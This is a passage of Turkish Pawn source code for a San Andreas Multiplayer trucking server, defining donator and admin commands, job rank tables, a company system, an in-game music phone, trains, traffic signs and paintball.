	format(YenilikYazi, 2000, "%s{00E3FC}#2 - Ýninal Kartýnýzýn baðlý olduðu ininal hesabýnýza giriþ yapýyorsunuz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC}#3 - Daha sonra sekmelerden 'Para Transferi' sekmesine giriþ yapýyorsunuz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC}#4 - Barkod numarasý yerine 'fb.com/tircilarmekanivip' sayfasýndan aldýðýnýz barkodu girip para transferini.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC}Onaylýyorsunuz\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC}	(Stunt nesneleri, özel araçlar, heyecan verici parkurlar içermektedir)\n", YenilikYazi);

	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FCB100}Ýninal Kart Nedir =", YenilikYazi, "Kapat", "");
	return 1;
}
CMD:donator(playerid, params[])
{
	new YenilikYazi[2000];
/*	if(APlayerData[playerid][PlayerDonLevel] == 0);
	{
	format(YenilikYazi, 2000, "%s{FFFFFF}Þuanda DONATOR Üyeliðiniz bulunmamaktadýr.\n", YenilikYazi);
	}
	if(APlayerData[playerid][PlayerDonLevel] > 0);
	{
	format(YenilikYazi, 2000, "%s{FFFFFF}Þuanda DONATOR Üyeliðiniz bulunmakta.\n", YenilikYazi);
	}*/
    format(YenilikYazi, 2000, "%s\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{FFFFFF}Donator Üyeliðinin Avantajlarý:\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Sýnýrsýz olarak /Myskin komutu kazanýrsýnýz. Dilediðiniz zaman karakterinizi deðiþtirebilirsiniz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Sýnýrsýz olarak adýnýz LS Donator caddesine yazýlýr.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Oyuna Giriþ yaptýðýnýzda Size Özel karþýlama yazýsý çýkar.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} /godonator kodu ile donatorlara özel olan caddeye gidebilirsiniz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC} Yeni yapýlacak olan donator özel mapýna sýnýrsýz giriþ hakký kazanýrsýnýz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{00E3FC}	(Stunt nesneleri, özel araçlar, heyecan verici parkurlar içermektedir)\n", YenilikYazi);

	format(YenilikYazi, 2000, "%s\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{FFFFFF}Unutmayýn! Donator Demek Baðýþçý demektir bu baðýþ her zaman yapýlabilir fakat {ADFF2F}/market {FFFFFF} kýsmýnda yazan \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{FFFFFF} fiyat kadar baðoþ yaparsanýz DONATOR üyeliði hizmeti alýrsýnýz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{FFFFFF}Donator Üyeliði satýn almak için {ADFF2F}/market {FFFFFF} menüsündeki fiyat ve satýn alma yöntemlerine bakabilirsiniz.\n", YenilikYazi);

	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FCB100}DONATOR Üyelik Hakkýnda", YenilikYazi, "Kapat", "");
	return 1;
}/*
CMD:donator(playerid, params[])
{
	new YenilikYazi[2000];

	format(YenilikYazi, 2000, "%s{ADFF2F}DONATOR NEDÝR?\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{F8F8FF}1- Sýnýrsýz olarak /Myskin komutu kazanýrsýnýz. Dilediðiniz zaman karakterinizi deðiþtirebilirsiniz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{F8F8FF}2- Sýnýrsýz olarak adýnýz LS Donator caddesine yazýlýr.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{F8F8FF}3- Oyuna Giriþ yaptýðýnýzda Size Özel karþýlama yazýsý çýkar.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{F8F8FF}4- /godonator kodu ile donatorlara özel olan caddeye gidebilirsiniz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{F8F8FF}5- Yeni yapýlacak olan donator özel mapýna sýnýrsýz giriþ hakký kazanýrsýnýz.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{F8F8FF}   (Stunt nesneleri, özel araçlar, heyecan verici parkurlar içermektedir)\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{F8F8FF} \n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{F8F8FF}Fiyat: Minimum {00CED1}Ýninal 10 TL {F8F8FF}olarak belirlenmiþtir.\n", YenilikYazi);
	format(YenilikYazi, 2000, "%s{F8F8FF}Ýletiþim: {80FFFF}www.facebook.com/tircilarmekanivip\n", YenilikYazi);

	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{ADFF2F}Donatorluk Hakkýnda", YenilikYazi, "Kapat", "");
	return 1;
}
*/
CMD:write(playerid, params[])
{
	SendAdminText(playerid, "write", params);
	if(APlayerData[playerid][PlayerLevel] < 1 && Root[playerid] == 0) return 1;
	ShowPlayerDialog(playerid, 9898, DIALOG_STYLE_INPUT, "{00FF00}Yazý Yaz", "{F8F8FF}Konsolda çýkmasýný istediðiniz yazýyý yazýnýz:", "Yazdýr", "Ýptal");
	return 1;
}

new BakimYapLo;

CMD:bakim(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 2)return SendClientMessage(playerid,-1,"{FF0000}Bu komutu kullanmaya yetkiniz yok");
	if(BakimYapLo == 0)
	{
	    BakimYapLo = 1;
	    SendClientMessageToAll(-1, "{FFCC00}» {FFFFFF}SUNUCU BAKIM MODUNA ALINDI!!!");
	}else{
	    BakimYapLo = 0;
	    SendClientMessageToAll(-1, "{FFCC00}» {FFFFFF}SUNUCU BAKIM MODUNDAN ÇIKTI!!!");
	}
	return 1;
}

new PMGapat[MAX_PLAYERS];

new SonGorev[MAX_PLAYERS][2];

new Float:CezaOdemeYerleri[3][3]={
{1542.4910,-1675.7490,13.5546}, // LSPD
{-1605.9478,717.4630,12.0554}, // SFPD
{2286.9290,2423.8462,10.8203} // LVPD
};

new MagaraAdami[MAX_PLAYERS];

new GorevTime[MAX_PLAYERS];

new IsimKapat[MAX_PLAYERS];
new TextKapat[MAX_PLAYERS];
new CMDKapat[MAX_PLAYERS];
new DuyuruKapat[MAX_PLAYERS];

new FakeLevel[MAX_PLAYERS];

new Float:SabitHiz[MAX_PLAYERS];

new bool:HusoEvde[MAX_PLAYERS];

// ************************************************************************************************************************************************************
// Rank Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
new Rank[MAX_PLAYERS];

enum RankInfo
{
	RankName[100],
	RankScore
};
// Bütün meslekler için Ranklarýn skorlarýný ayný tutarsan iyi olur :D
new TruckerRanks[7][RankInfo]={
{"Caylak Sofor"},
{"Acemi Sofor", 250},
{"Deneyimli Sofor", 500},
{"Uzman Sofor", 1000},
{"Profesyonel Sofor", 1500},
{"Yollarin Krali", 3000},
{"Server Emektari", 6000}
};
new PboyRanks[7][RankInfo]={
{"Cirak", 1500},
{"Pizza Dagiticisi", 2350},
{"Hamur acici", 2750},
{"Pizza Ustasi", 3500},
{"Delizioso Pizza", 4300},
{"Rapidamente Pizza", 5800},
{"Maestro Al Pizza", 7000}
};
new BusDriverRanks[7][RankInfo]={
{"Caylak Sofor"},
{"Acemi Sofor", 250},
{"Deneyimli Sofor", 500},
{"Uzman Sofor", 1000},
{"Profesyonel Sofor", 1500},
{"Yollarin Krali", 3000},
{"Server Emektari",6000}
};
new DolmusDriverRanks[7][RankInfo]={
{"Caylak Sofor"},
{"Acemi Sofor", 250},
{"Deneyimli Sofor", 500},
{"Uzman Sofor", 1000},
{"Profesyonel Sofor", 1500},
{"Yollarin Krali", 3000},
{"Server Emektari",6000}
};
new PilotRanks[7][RankInfo]={
{"Caylak Pilot"},
{"Acemi Pilot", 250},
{"Kabin Amiri", 500},
{"Yardimci Pilot", 1000},
{"Pilot", 1500},
{"Kaptan Pilot", 3000},
{"Hava Komutani", 6000}
};

new MafiaRanks[7][RankInfo]={
{"Eleman"},
{"Caylak Hirsiz", 250},
{"Usta Hirsiz", 500},
{"Yollarin Korkusu", 1000},
{"Ganimet Avcisi", 1500},
{"Sag Kol", 3000},
{"Buyuk Patron", 6000}
};

new PoliceRanks[7][RankInfo]={
{"Acemi Polis"},
{"Usta Polis", 550},
{"Komiser Yardimcisi", 750},
{"Komiser", 1250},
{"Amir Yardimcisi", 2000},
{"Amir", 3000},
{"Emniyet Muduru", 6000}
};

new RoadWorkerRanks[7][RankInfo]={
{"Amele"},
{"Yol Bulan", 250},
{"Çekim Ustasý", 500},
{"Laz Mapper", 1000},
{"Caylak Tamirci", 1500},
{"Usta Tamirci", 3000},
{"Radar Bulan", 6000}
};

new GemiciRanks[7][RankInfo]={
{"Gemici Ciragi"},
{"Acemi Denizci", 250},
{"Usta Denizci", 500},
{"Deneyimli Denizci", 1000},
{"Yillarin Denizcisi", 1500},
{"Kaptan", 3000},
{"Kaptan-i Derya", 6000}
};

new OduncuRanks[7][RankInfo]={
{"Acemi Ormanci"},
{"Cirak Ormanci", 250},
{"Usta Ormanci", 500},
{"Deneyimli Ormanci", 1000},
{"Yillarin Ormancisi", 1500},
{"Orman Muhendisi", 3000},
{"Emektar Ormanci", 6000}
};

new BalikciRanks[7][RankInfo]={
{"Balikci Ciragi"},
{"Acemi Balikci", 250},
{"Usta Balikci", 500},
{"Deneyimli Balikci", 1000},
{"Yillarin Balikcisi", 1500},
{"BALIKOFIS", 3000},
{"Emektar Balikci", 6000}
};

new CopcuRanks[7][RankInfo]={
{"Kagit Toplayicisi"},
{"Yol Temizlikcisi", 350},
{"Copcu Surucusu", 500},
{"Deneyimli Copcu", 1000},
{"Copcu Ustasi", 1500},
{"Geri Donusumcu", 3000},
{"Copculer Krali", 6000}
};

new FBYRanks[7][RankInfo]={
{"Caylak", 4000},
{"Acemi Silahci", 4350},
{"Sehir Koruyucusu", 5000},
{"Komutan", 7000},
{"Ajan", 8500},
{"SWAT", 10000},
{"Oyun Krali", 15000}
};

new BankaRanks[7][RankInfo]={
{"Caylak Bankaci", 1000},
{"Acemi Bankaci", 1350},
{"Usta Bankaci", 1500},
{"Deneyimli Bankaci", 2000},
{"Para Avcisi", 2500},
{"Para Manyagi", 4000},
{"Finansci", 6000}
};

new FireRanks[7][RankInfo]={
{"Caylak Itfaiyeci", 1000},
{"Acemi Itfaiyeci", 1350},
{"Can Kurtaran", 1500},
{"Mahle Itfaiyecisi", 2000},
{"Deneyimli Itfaiyeci", 2500},
{"Sehir Koruyucusu", 4000},
{"Dunyayi Kurtaran Adam", 6000}
};

new KargocuRanks[7][RankInfo]={
{"Cirak", 1500},
{"Kargo Dagiticisi", 2350},
{"Firma Sorumlusu", 2750},
{"Usta Kargocu", 3500},
{"Kargocu Abi", 4300},
{"Seri Dagitici", 5800},
{"Kargocular Krali", 7000}
};

new MeslekdeYaparmis[MAX_PLAYERS];
new MeslekSkorlar[15][RankInfo]={
{"Kamyoncu"},
{"Otobüsçü"},
{"Yol Ýþçisi"},
{"Tamirci", 50},
{"Mafya", 3500},
{"Pilot", 200},
{"Copcu", 300},
{"Can Kurtaran", 350},
{"Balikci", 400},
{"Oduncu", 600},
{"Gemici", 700},
{"Polis", 1000},
{"Bankaci", 1000},
{"Itfaiyeci", 2000},
{"Cevik Kuvvet", 4000}
};

// ************************************************************************************************************************************************************
// Rekor Ölçüm Sistemi
// ************************************************************************************************************************************************************
new Rekor, RekorTarih[20] = "0.0.0";

// ************************************************************************************************************************************************************
// Yeni SendAdminText [ EvoturK ]
// ************************************************************************************************************************************************************
new PlayerText:UI_AdminText[MAX_PLAYERS][7];
new AdminTextYazi[MAX_PLAYERS][7][256];
// ************************************************************************************************************************************************************
// Yeni Duyuru Text [ Reiss_Umut ]
// ************************************************************************************************************************************************************
new PlayerText:UI_DuyuruText[MAX_PLAYERS][7];
new DuyuruTextYazi[MAX_PLAYERS][7][256];

// ************************************************************************************************************************************************************
// FPS Kamerasý [ EvoturK ]
// ************************************************************************************************************************************************************
new OyuncuAFPS[MAX_PLAYERS],
	OyuncuAFPS_Obje[MAX_PLAYERS];

// ************************************************************************************************************************************************************
// MeslekUI [ EvoturK ]
// ************************************************************************************************************************************************************
enum MeslekInfo
{
	meslekName[30],
	meslekSkor,
	meslekModel
};

new Meslekler[16][MeslekInfo]={
{"Tirci", 0, 515},
{"Otobuscu", 0, 437},
{"Pilot", 200, 519},
{"Polis", 1000, 596},
{"Mafya", 3500, 495},
{"Yol Iscisi", 0, 525},
{"Gemici", 700, 484},
{"Oduncu", 600, 422},
{"Balikci", 400, 453},
{"Copcu", 300, 408},
{"Cevik Kuvvet", 4000, 490},
{"Bankaci", 1000, 428},
{"Itfaiyeci", 2000, 407},
{"Pizzaci", 2000, 448},
{"Kargocu", 1250, 482},
{"Dolmuscu", 2500, 483}
};

new MeslekUI_Mod[MAX_PLAYERS], // 1 = Meslek Seç | 2 = Skin Seç
	MeslekUI_Item[MAX_PLAYERS][16], // -1 = Yok
	MeslekUI_ItemModel[MAX_PLAYERS][16];

new Text:MeslekUI_Text[7],
	PlayerText:MeslekUI_Logo[MAX_PLAYERS][16],
	PlayerText:MeslekUI_Yazi[MAX_PLAYERS][16],
	PlayerText:MeslekUI_Bilgi[MAX_PLAYERS];


// ************************************************************************************************************************************************************
// TMMobile Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
#define DialogMuzik             3300
#define DialogMuzikAra          3301
#define DialogNewMP3Name        3302
#define DialogNewMP3URL         3303
#define DialogNewMP3Test        3304
#define DialogRadAra           	3305
#define DialogNewRadName        3306
#define DialogNewRadURL         3307
#define DialogNewRadTest        3308
#define DialogMP3ArsivInfo2     3309
#define DialogTMMBG             3310

#define APP_Yok         		0
#define APP_Home                1
#define APP_Muzik               2
#define APP_Radyo               3
#define APP_Ayarlar             4

new TMM_APP[MAX_PLAYERS],
	TMM_BGSel[MAX_PLAYERS];

new CalanMP3Name[100],
	CalanMP3ID,
	CalanMP3URL[300];

new MPMode[MAX_PLAYERS], // 0 = Kapalý  1 = Server  2 = Oyuncu Muzik  3 = Radyo
	MPID[MAX_PLAYERS],
	MPName[MAX_PLAYERS][100],
	MPURL[MAX_PLAYERS][300];

new MPItem[MAX_PLAYERS][7],
	MPSel[MAX_PLAYERS],
	MPSayfa[MAX_PLAYERS],
	MPAra[MAX_PLAYERS][100];

new PlayerText:TMM_BG[MAX_PLAYERS],
	PlayerText:TMM_UBar[MAX_PLAYERS],
	PlayerText:TMM_ABar[MAX_PLAYERS],
	PlayerText:TMM_Home[MAX_PLAYERS],
	PlayerText:TMM_Baslik[MAX_PLAYERS],
	PlayerText:TMM_Saat[MAX_PLAYERS],
	PlayerText:TMM_Item[MAX_PLAYERS][7],
	PlayerText:TMM_OncekiS[MAX_PLAYERS],
	PlayerText:TMM_SonrakiS[MAX_PLAYERS],
	PlayerText:TMM_Sayfa[MAX_PLAYERS];

new	PlayerText:TMM_HS1[MAX_PLAYERS],
	PlayerText:TMM_HS2[MAX_PLAYERS],
	PlayerText:TMM_HT[MAX_PLAYERS],
	PlayerText:TMM_HE[MAX_PLAYERS],
	PlayerText:TMM_Muzik[MAX_PLAYERS],
	PlayerText:TMM_MuzikL[MAX_PLAYERS],
	PlayerText:TMM_Radyo[MAX_PLAYERS],
	PlayerText:TMM_RadyoL[MAX_PLAYERS],
	PlayerText:TMM_Ayarlar[MAX_PLAYERS],
	PlayerText:TMM_AyarlarL[MAX_PLAYERS],
	PlayerText:TMM_Banka[MAX_PLAYERS],
	PlayerText:TMM_BankaL[MAX_PLAYERS],
	PlayerText:TMM_Krktr[MAX_PLAYERS],
	PlayerText:TMM_KrktrL[MAX_PLAYERS];

new PlayerText:TMM_Yeni[MAX_PLAYERS],
	PlayerText:TMM_YeniL[MAX_PLAYERS],
	PlayerText:TMM_Ara[MAX_PLAYERS],
	PlayerText:TMM_AraL[MAX_PLAYERS];

new SelectedMP3Name[MAX_PLAYERS][80];
new SelectedMP3URL[MAX_PLAYERS][256];
/*
ESKÝ SÝSTEM MP3 Arþiv Sistemi
#define MP3File 				"ServerData/MP3/MP3_%d.ini"
#define RadFile 				"ServerData/Radyo/Rad_%d.ini"

#define DialogMP3ArsivInfo      3300
#define DialogNewMP3Name        3301
#define DialogNewMP3URL         3302
#define DialogNewMP3Test        3303
#define DialogNewRadName        3304
#define DialogNewRadURL         3305
#define DialogNewRadTest        3306
#define DialogMP3ArsivInfo2     3307

new SelectedMP3Name[MAX_PLAYERS][80];
new SelectedMP3URL[MAX_PLAYERS][256];

enum MP3Info
{
	MP3Name[80],
	MP3URL[256],
	MP3Exist
};

new MP3ler[2000][MP3Info];
new Iterator:MP3s<2000>;

new CalanMP3Name[100];
new CalanMP3ID;
new CalanMP3URL[300];

new PlayerText:UI_MPHeadBox[MAX_PLAYERS];
new PlayerText:UI_MPMainBox[MAX_PLAYERS];
new PlayerText:UI_MPHeadBaslik[MAX_PLAYERS];
new PlayerText:UI_MPRadyoLogo[MAX_PLAYERS];
new PlayerText:UI_MPRadyoYazi[MAX_PLAYERS];
new PlayerText:UI_MPMuzikLogo[MAX_PLAYERS];
new PlayerText:UI_MPMuzikYazi[MAX_PLAYERS];
new PlayerText:UI_MPItem[MAX_PLAYERS][10];
new PlayerText:UI_MPCMBox[MAX_PLAYERS];
new PlayerText:UI_MPCMArtwork[MAX_PLAYERS];
new PlayerText:UI_MPCMYazi[MAX_PLAYERS];
new PlayerText:UI_MPYMBox[MAX_PLAYERS];
new PlayerText:UI_MPYMLogo[MAX_PLAYERS];
new PlayerText:UI_MPYMYazi[MAX_PLAYERS];
new PlayerText:UI_MPSayfa[MAX_PLAYERS];
new PlayerText:UI_MPOSayfa[MAX_PLAYERS];
new PlayerText:UI_MPSSayfa[MAX_PLAYERS];

new MPde[MAX_PLAYERS]; // 0 = Deðil  1 = Home  2 = Radio  3 = Muzik
new MPSayfa[MAX_PLAYERS];
new MPItem[MAX_PLAYERS][10];
new MPSItem[MAX_PLAYERS];
new MPMode[MAX_PLAYERS]; // 0 = Kapalý  1 = Server  2 = Oyuncu Muzik  3 = Radyo
new MPName[MAX_PLAYERS][100];
new MPURL[MAX_PLAYERS][300];
new bool:MPMuzikte[MAX_PLAYERS];

new SelectedRadName[MAX_PLAYERS][80];
new SelectedRadURL[MAX_PLAYERS][256];

enum RadInfo
{
	RadName[80],
	RadURL[256],
	RadExist
};

new Radler[300][RadInfo];
new Iterator:Rads<300>;
*/
// ************************************************************************************************************************************************************
// Tren Sistemi [ Revolution(Fusional'den) ]
// ************************************************************************************************************************************************************
#define LABEL_RENK 				0xF68800FF
new NPCLSSF, Text3D:lssf3dtext;
forward LSSFTreni(arabaid);
new NPCLSLV, Text3D:lslv3dtext;
forward LSLVTreni(arabaid);
new NPCLVLS, Text3D:lvls3dtext;
forward LVLSTreni(arabaid);
new NPCLVSF, Text3D:lvsf3dtext;
forward LVSFTreni(arabaid);
new NPCSFLV, Text3D:sflv3dtext;
forward SFLVTreni(arabaid);
new NPCSFLS, Text3D:sfls3dtext;
forward SFLSTreni(arabaid);
/*new Coach1;
new Coach2;
new Barracks;
new LSPDcar;
new Ambulance;
new Ambulanceheli;
new Firetruck;
new Hunter;
new PDbike;
new Train;
new Infernus;
new Sultan;
new AT400;*/

new Bilet[MAX_PLAYERS];
forward PlayerToPointStripped(Float:radi, playerid, Float:x, Float:y, Float:z, Float:curx, Float:cury, Float:curz);

// ************************************************************************************************************************************************************
// Hediye Paketi Sistemi [ Hwang ]
// ************************************************************************************************************************************************************
#define MAX_PICKUP 					(100)

new
	KutuInfo[MAX_PLAYERS] = 0,
	Pickups[MAX_PICKUP],
	Kutu;

// ************************************************************************************************************************************************************
// Puþt Tabela Sistemi [ suleyman70 ]
// ************************************************************************************************************************************************************
#define DOSYA "Trafik.txt"

#define OBJ1 "Tali yol - sað"
#define OB1 1320
//
#define OBJ2 "Tali yol - sol"
#define OB2 1321
//
#define OBJ3 "Tali yol - yol bitiþ"
#define OB3 1323
//
#define OBJ4 "Tali yol - dörtlü"
#define OB4 1324
//
#define OBJ5 "Yön levhasý - normal"
#define OB5 3335
//
#define OBJ6 "Yön levhasý - büyük"
#define OB6 3336
//
#define OBJ7 "Yön levhasý - tekli büyük sol"
#define OB7 7246
//
#define OBJ8 "Yol çalýþma levhasý - küçük"
#define OB8 1443
//
#define OBJ9 "Kontrolsüz kaþvak"
#define OB9 8548
//
#define OBJ10 "Yön levhasý - tekli büyük sað"
#define OB10 10837
//
#define OBJ11 "Þehir levhasý - hoþgeldiniz küçük"
#define OB11 3337
//
#define OBJ12 "Þehir levhasý - hoþgeldiniz normal"
#define OB12 11455
//
#define OBJ13 "Hýz limiti levhasý"
#define OB13 11699
//
#define OBJ14 "Saða dönüþ yasaðý"
#define OB14 19948
//
#define OBJ15 "Sola dönüþ yasaðý"
#define OB15 19949
//
#define OBJ16 "Tehlikeli viraj sol"
#define OB16 19951
//
#define OBJ17 "Tehlikeli viraj sað"
#define OB17 19952
//
#define OBJ18 "Tehlikeli viraj sol x2"
#define OB18 19953
//
#define OBJ19 "Tehlikeli viraj sað x2"
#define OB19 19954
//
#define OBJ20 "Sola dönün"
#define OB20 19955
//
#define OBJ21 "Saða dönün"
#define OB21 19956
//
#define OBJ22 "Kýrmýzý ýþýk levhasý"
#define OB22 19964
//
#define OBJ23 "Dur levhasý"
#define OB23 19966
//
#define OBJ24 "Tek yön levhasý"
#define OB24 19970
//
#define OBJ25 "Bilgi levhasý normal"
#define OB25 19972
//
#define OBJ26 "Kazý çalýþmasý levhasý"
#define OB26 19974
//
#define OBJ27 "Yol ver levhasý"
#define OB27 19976
//
#define OBJ28 "Çekme bölgesi levhasý"
#define OB28 19978
//
#define OBJ29 "Bilgi levhasý küçük"
#define OB29 19981

new pObj[MAX_PLAYERS] = -255;
new pObjText[MAX_PLAYERS];
new Objs[MAX_OBJECTS];
new lItem[MAX_PLAYERS];
new iRenk[MAX_PLAYERS];
new tRenk[MAX_PLAYERS];
new iBoyut[MAX_PLAYERS];
new Levhalar;

// PaintBall Sistemi

#define COLOR_LIGHTRED 0xFF6347AA
#define COLOR_LIGHTBLUE 0x33CCFFAA
#define COLOR_YELLOW 0xFFFF00AA
#define COLOR_WHITE 0xFFFFFFAA

#define COL_WHITE "{FFFFFF}"
#define COL_RED "{F81414}"
#define COL_YELLOW "{F3FF02}"
#define COL_LRED "{FFA1A1}"


forward PaintBallStarting(playerid);
forward PaintBallStart();
forward PaintBallEnd();

new Float:painthealth[MAX_PLAYERS];
new PlayerPBKills[MAX_PLAYERS];
new PaintSkin[MAX_PLAYERS];
new PaintTEXT[MAX_PLAYERS];
new bool:PlayerPBing[MAX_PLAYERS];
new PBLeaderid;
new PBLeaderKills = 0;
new PBPlayers = 0;
new PBteam[MAX_PLAYERS];
new bool:PBStarted;

new PBSkins[] =
{
	137,
	181,
	212
};

new Float:PBSpawns[][] =
{
	{-348.1376,2222.3022,42.4912,0.5975}, // Spawn 1
	{-366.0266,2263.8604,42.5641,271.2900}, // Spawn 2
	{-431.7350,2240.2869,42.9834,178.7918}, // Spawn 3
	{-452.6353,2217.8867,42.4297,189.6790}, // spawn 4
	{-392.8849,2198.0518,42.4245,189.0656} // spawn
};


// ************************************************************************************************************************************************************
// Þirket Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
#define SirketFile 				"ServerData/Sirket/Sirket_%d.ini"
#define SirketArabaFile 			"ServerData/SirketAraba/Sirket_%d.ini"

#define MAX_SIRKET              	20
#define MAX_SIRKET_ARABA        	2000

//#define DialogPOL               	2999
#define DialogCSName 				3000
#define DialogCSTag                 3001
#define DialogCSDeger 				3002
#define DialogCSMaxUye          	3003
#define DialogCSRenk1 				3004
#define DialogCSRenk2 				3005
#define DialogSirketHome 			3006
#define DialogSirketMSG  			3007
#define DialogSirketIsim 			3008
#define DialogSirketGelistir 		3009
#define DialogSirketTeklif 			3010
#define DialogSirketAyril 			3011
#define DialogSirketDorse       	3012
#define DialogSirketTir         	3013
#define DialogSirketTirYonet		3014
#define DialogSirketOran        	3015
#define DialogSirketTirMinRutbe		3016
#define DialogSirketUyeList     	3017
#define DialogSirketUyeYonet        3018
#define DialogSirketUyeYonetKatki   3019
#define DialogSirketUyeYonetRutbe   3020
#define DialogSirketUyeYonetAt      3021
#define DialogSirketUyeYonetMaas    3022

enum SirketInfo
{
	SirketName[128],
	SirketTag[5],
	SirketSahip[70],
	SirketDuyuru[256],
	SirketUye,
	SirketMaxUye,
	SirketKasa,
	SirketDeger,
	Float:SirketX,
	Float:SirketY,
	Float:SirketZ,
	Float:SirketInfoX,
	Float:SirketInfoY,
	Float:SirketInfoZ,
	Float:SirketMinX,
	Float:SirketMinY,
	Float:SirketMaxX,
	Float:SirketMaxY,
	SirketGate,
	Float:SirketGateX,
	Float:SirketGateY,
	Float:SirketGateZ,
	Float:SirketGateRX,
	Float:SirketGateRY,
	Float:SirketGateRZ,
	Float:SirketKasaX,
	Float:SirketKasaY,
	Float:SirketKasaZ,
	Float:SirketKasaRZ,
	Float:SirketBenzinX,
	Float:SirketBenzinY,
	Float:SirketBenzinZ,
	SirketRenk1,
	SirketRenk2,
	SirketOran,
	SirketDolum[20],
	SirketBorc,
	//Text3D:Sirket3D,
	//SirketPickup,
	Text3D:SirketInfo3D,
	SirketInfoPickup,
	Text3D:SirketBenzin3D,
	SirketBenzinPickup,
	SirketZone,
	SirketExist,
	SirketNeedSave
};

new Sirketler[MAX_SIRKET][SirketInfo];
new Iterator:SRKTs<MAX_SIRKET>;

new SirketRutbeName[4][40]={
"Týrcý",
"Usta Týrcý",
"Sirket Yetkilisi",
"Patron"
};

new SecilenSirketUye[MAX_PLAYERS],
	SirketUyeListName[MAX_PLAYERS][25][30],
	SirketUyeListSonGiris[MAX_PLAYERS][25][20],
	SirketUyeListKatki[MAX_PLAYERS][25],
	SirketUyeListRutbe[MAX_PLAYERS][25],
	SirketUyeListPara[MAX_PLAYERS][25],
	SirketUyeSayfa[MAX_PLAYERS];

enum SirketArabaInfo
{
	SASirketID,
	SAAID,
	SAModel,
	SAFiyat,
	SAMinRutbe,
	Float:SAX,
	Float:SAY,
	Float:SAZ,
	Float:SARZ,
	Text3D:SA3D,
	SAExist,
	SANeedSave
};

new SirketAraba[MAX_SIRKET_ARABA][SirketArabaInfo];
new Iterator:SAs<MAX_SIRKET_ARABA>;
new ArabaSirket[MAX_VEHICLES] = -1;

new Sirket[MAX_PLAYERS];
new SirketRutbe[MAX_PLAYERS];
new SirketKatki[MAX_PLAYERS];

new SirketBenzini[MAX_PLAYERS];

new SirketDorse[MAX_PLAYERS];

new SAMenuItem[MAX_PLAYERS][20];
new SASItem[MAX_PLAYERS];

new TSirketDurum[MAX_PLAYERS];
new TSirketName[MAX_PLAYERS][128];
new TSirketTag[MAX_PLAYERS][5];
new TSirketDeger[MAX_PLAYERS];
new TSirketMaxUye[MAX_PLAYERS];
new TSirketRenk1[MAX_PLAYERS];
new TSirketRenk2[MAX_PLAYERS];
new Float:TSirketPos[MAX_PLAYERS][3];
new Float:TSirketInfo[MAX_PLAYERS][3];
new Float:TSirketArea[MAX_PLAYERS][4];
new Float:TSirketKasa[MAX_PLAYERS][4];
new Float:TSirketBenzin[MAX_PLAYERS][3];
new TSirketKapi[MAX_PLAYERS];
new SirketTeklifEden[MAX_PLAYERS];

new SirketKayitTimer;

new VehNames[][] =
{
    "Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel",
	"Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana", "Infernus",
	"Voodoo", "Pony", "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam",
    "Esperanto", "Taxi", "Washington", "Bobcat", "Whoopee", "BFInjection",
	"Hunter", "Premier", "Enforcer", "Securicar", "Banshee", "Predator", "Bus",
	"Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach", "Cabbie",
	"Stallion", "Rumpo", "RC Bandit", "Romero", "Packer", "Monster", "Admiral",
	"Squalo", "Seasparrow", "Pizzaboy", "Tram", "Trailer", "Turismo", "Speeder",
	"Reefer", "Tropic", "Flatbed", "Yankee", "Caddy", "Solair", "BerkleysRCVan",
	"Skimmer", "PCJ-600", "Faggio", "Freeway", "RCBaron", "RCRaider", "Glendale",
	"Oceanic","Sanchez", "Sparrow", "Patriot", "Quad", "Coastguard", "Dinghy",
	"Hermes", "Sabre", "Rustler", "ZR-350", "Walton", "Regina", "Comet", "BMX",
	"Burrito", "Camper", "Marquis", "Baggage", "Dozer", "Maverick", "NewsChopper",
	"Rancher", "FBI Rancher", "Virgo", "Greenwood", "Jetmax", "Hotring", "Sandking",
	"BlistaCompact", "PoliceMaverick", "Boxvillde", "Benson", "Mesa", "RCGoblin",
	"HotringRacerA", "HotringRacerB", "BloodringBanger", "Rancher", "SuperGT",
	"Elegant", "Journey", "Bike", "MountainBike", "Beagle", "Cropduster", "Stunt",
 	"Tanker", "Roadtrain", "Nebula", "Majestic", "Buccaneer", "Shamal", "Hydra",
 	"FCR-900", "NRG-500", "HPV1000", "CementTruck", "TowTruck", "Fortune",
 	"Cadrona", "FBITruck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer",
 	"Remington", "Slamvan", "Blade", "Freight", "Streak", "Vortex", "Vincent",
    "Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder", "Primo",
	"Cargobob", "Tampa", "Sunrise", "Merit", "Utility", "Nevada", "Yosemite",
